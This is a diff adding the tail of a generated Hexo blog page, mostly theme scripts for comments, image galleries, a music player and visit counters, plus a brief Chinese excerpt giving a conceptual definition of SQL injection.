+          stripContent: " SQL注入漏洞  一.前置  1.sql注入的概述和原理 SQL注入（SQL Injection）是一种常见的Web安全漏洞，形成的主要原因是web应用程序在接收相关数据参数时未做好过滤，将其直接带入到数据库中查询，导致攻击者可以拼接执行构造的SQL语句。那什么是SQL了？结构化查询语言（Structured Query Language，缩写：SQL），是一种关系型数据库查询的标准编程语言，用于存取数据以及查询、更新、删除和管理关系型数据库（即SQL是一种数据库查询语言） 注入产生的原因是后",
+          date: "Mon Dec 29 2025 15:00:34 GMT+0800",
+          updated: "Tue Aug 11 2026 10:14:25 GMT+0800",
+          cover: "/images/banner.webp",
+        };
+      </script>
+        
+<script src="/js/insert_highlight.js" data-pjax></script>
+
+      
+<script src="/js/tabs.js" data-pjax defer></script>
+
+        
+<script src="https://npm.webcache.cn/@zumer/snapdom@1.9.14/dist/snapdom.min.js" integrity="sha384-OEQ+fJp&#x2F;Mvi2uzBREXybtxryJvLytWapuHu4EE6LPwTKUwATYcc55tPPcZTzVcmx" crossorigin="anonymous" defer data-pjax></script>
+
+        
+<script src="https://npm.webcache.cn/qrcode@1.5.1/build/qrcode.js" integrity="sha384-VT1EeewTCEXgndcPMQ0PzV+uVFYjxFIjmAA7s5gcMX9t4Dt5TD+OVQIn7NJWIXn7" crossorigin="anonymous" defer data-pjax></script>
+
+      <script type="module" data-pjax>
+        (async () => {
+          const PhotoSwipeLightbox = (await safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe-lightbox.esm.min.js", "sha384-DiL6M/gG+wmTxmCRZyD1zee6lIhawn5TGvED0FOh7fXcN9B0aZ9dexSF/N6lrZi/")).default;
+          const initPswp = (gallery, children) => {
+            if (_$$(`${gallery} ${children}`).length > 0) {
+              new PhotoSwipeLightbox({
+                gallery,
+                children,
+                pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+              }).init();
+            }
+          }
+          const pswp = () => {
+            initPswp('.article-entry', 'a.article-gallery-item');
+            initPswp('.article-gallery', 'a.article-gallery-item');
+          }
+          pswp();
+        })();
+      </script>
+        
+
+<script data-pjax>
+  var loadScript = (src, integrity) => {
+    const script = document.createElement('script');
+    script.src = src;
+    if (integrity) script.integrity = integrity;
+    script.crossOrigin = 'anonymous';
+    return script;
+  };
+
+  var commentConfigKeys = ["utterances"];
+  var commentConfig = {
+    utterances: {
+      enable: true,
+      load: () => {
+        const container = document.querySelector('.utterances-comment'); 
+        if (!container) return;
+        container.style.display = 'block';
+
+        let theme = 'auto';
+        const parsedTheme = theme === 'auto' ? (document.documentElement.getAttribute('data-theme') === 'dark' ? 'github-dark' : 'github-light') : theme;
+
+        // 创建 utterances 脚本
+        const script = document.createElement('script');
+        script.src = 'https://utteranc.es/client.js';
+        script.setAttribute('repo', 'Cl1ck-t0/Cl1ck-t0.github.io');
+        script.setAttribute('issue-term', 'title');
+        script.setAttribute('theme', parsedTheme);
+        script.setAttribute('crossorigin', 'anonymous');
+        script.async = true;
+
+        // 清空容器（防止重复加载）并插入脚本
+        container.innerHTML = '';
+        container.appendChild(script);
+        if (theme === 'auto') {
+          const themeHandler = (e) => {
+            const iframe = container.querySelector('iframe.utterances-frame');
+            if (!iframe || !iframe.contentWindow) {
+              document.body.removeEventListener('reimu:theme-set', themeHandler);
+              return;
+            }
+            iframe.contentWindow.postMessage({ type: 'set-theme', theme: e.detail.isDark ? 'github-dark' : 'github-light' }, 'https://utteranc.es');
+          };
+          document.body.addEventListener('reimu:theme-set', themeHandler);
+        }
+      }
+    },
+  }
+  commentConfig.enable = commentConfigKeys.some(key => commentConfig[key].enable);
+
+  var defaultComment = '';
+  if (commentConfig.enable) {
+    // 1. 首先检查localStorage中是否有保存的评论类型
+    var savedCommentType = localStorage.getItem('commentType');
+    
+    // 2. 如果localStorage中有值且对应的评论系统可用，就使用它
+    if (savedCommentType) {
+      if (commentConfig[savedCommentType]?.enable) {
+        defaultComment = savedCommentType;
+      }
+    }
+    
+    // 3. 如果localStorage无效，检查配置的默认评论系统
+    if (!defaultComment) {
+      var configDefault = 'waline';
+      if (commentConfig[configDefault]?.enable) {
+        defaultComment = configDefault;
+      }
+    }
+    
+    // 4. 如果前两项都无效，按指定顺序找到第一个可用的评论系统
+    if (!defaultComment) {
+      defaultComment = commentConfigKeys.find(sys => commentConfig[sys].enable) || '';
+    }
+  }
+  function loadComments() {
+    if (!commentConfig.enable) return;
+    const loadedComments = {
+      valine: false,
+      waline: false,
+      twikoo: false,
+      gitalk: false,
+      giscus: false
+    };
+
+    // 隐藏所有评论容器
+    const hideAllComments = () => {
+      const commentContainers = document.querySelectorAll('.comment');
+      commentContainers.forEach(container => {
+        container.style.display = 'none';
+      });
+    };
+
+    // 按需加载评论系统
+    const loadCommentSystem = (type) => {
+      if (loadedComments[type]) {
+        // 如果已加载，只需显示对应容器
+        document.querySelector(`.${type}-comment`).style.display = 'block';
+        return;
+      }
+
+      // 根据类型加载对应的脚本
+      commentConfig[type]?.load();
+      loadedComments[type] = true;
+    };
+
+    // 评论组件选择器
+    const changeActiveCommentItems = (item) => {
+      const commentItems = document.querySelectorAll('.selector-item');
+      for (let i = 0; i < commentItems.length; i++) {
+        commentItems[i].classList.remove('active');
+      }
+      item.classList.add('active');
+
+      // 获取要加载的评论系统类型
+      const commentType = item.getAttribute('data-selector');
+
+      // 隐藏所有评论系统
+      hideAllComments();
+
+      // 加载选中的评论系统
+      loadCommentSystem(commentType);
+    };
+
+    const commentInit = () => {
+      // 评论组件选择器点击事件
+      const commentItems = document.querySelectorAll('.selector-item');
+      for (let item of commentItems) {
+        item.addEventListener('click', () => {
+          // 保存选择器状态
+          const commentType = item.getAttribute('data-selector');
+          window.localStorage.setItem('commentType', commentType);
+          // 切换选中状态
+          changeActiveCommentItems(item);
+        });
+      }
+
+      // 检查是否需要加载默认评论系统
+      if (defaultComment) {
+        const defaultSelectorItem = document.querySelector(`[data-selector="${defaultComment}"]`);
+        if (!defaultSelectorItem) return;
+        defaultSelectorItem.style.display = 'block';
+        defaultSelectorItem.classList.add('active');
+        loadCommentSystem(defaultComment);
+      }
+    }
+
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', commentInit);
+    } else {
+      commentInit();
+    }
+  };
+  loadComments();
+</script>
+
+  </div>
+</div>
+
+
+  <script>
+    console.log(String.raw`%c 
+ ______     ______     __     __    __     __  __    
+/\  == \   /\  ___\   /\ \   /\ "-./  \   /\ \/\ \   
+\ \  __<   \ \  __\   \ \ \  \ \ \-./\ \  \ \ \_\ \  
+ \ \_\ \_\  \ \_____\  \ \_\  \ \_\ \ \_\  \ \_____\ 
+  \/_/ /_/   \/_____/   \/_/   \/_/  \/_/   \/_____/ 
+                                                  
+`,'color: #ff5252;')
+    console.log('%c Theme.Reimu v' + '1.12.0' + ' %c https://github.com/D-Sketon/hexo-theme-reimu ', 'color: white; background: #ff5252; padding:5px 0;', 'padding:4px;border:1px solid #ff5252;')
+  </script>
+  
+
+
+  
+<script src="https://npm.webcache.cn/busuanzi@2.3.0/bsz.pure.mini.js" integrity="sha384-0M75wtSkhjIInv4coYlaJU83+OypaRCIq2SukQVQX04eGTCBXJDuWAbJet56id+S" crossorigin="anonymous" async></script>
+
+
+<script>
+  if ('serviceWorker' in navigator) {
+    navigator.serviceWorker.getRegistrations().then((registrations) => {
+      for (let registration of registrations) {
+        registration.unregister();
+      }
+    });
+  }
+</script>
+
+
+    <script>
+      var setupAPlayer = () => {
+        if (!false || !window.matchMedia('(max-width: 768px)').matches) {
+          if (window.matchMedia('(max-width: 959px)').matches) {
+            const meting = _$('meting-js');
+            if (meting) {
+              meting.setAttribute('fixed', 'true');
+              const aside = meting.parentNode?.parentNode;
+              if (aside?.tagName === 'ASIDE') {
+                meting.parentNode.removeChild(meting);
+                document.body.appendChild(meting);
+              }
+            }
+          }
+        }
+      };
+    </script>
+  
+<script src="https://npm.webcache.cn/aplayer@1.10.1/dist/APlayer.min.js" integrity="sha384-gdGYZwHnfJM54evoZhpO0s6ZF5BQiybkiyW7VXr+h5UfruuRL&#x2F;aORyw+5+HZoU6e" crossorigin="anonymous" defer onload="setupAPlayer()"></script>
+
+    
+<script src="https://npm.webcache.cn/meting@2.0.1/dist/Meting.min.js" integrity="sha384-ASVlpKF80A22OXTK3tfEjZm1EL6uFMKIC4p8+0maanw1S&#x2F;IyB+Y4JG+ZDU7GpKE8" crossorigin="anonymous" defer></script>
+
+
+
+  </body>
+  </html>
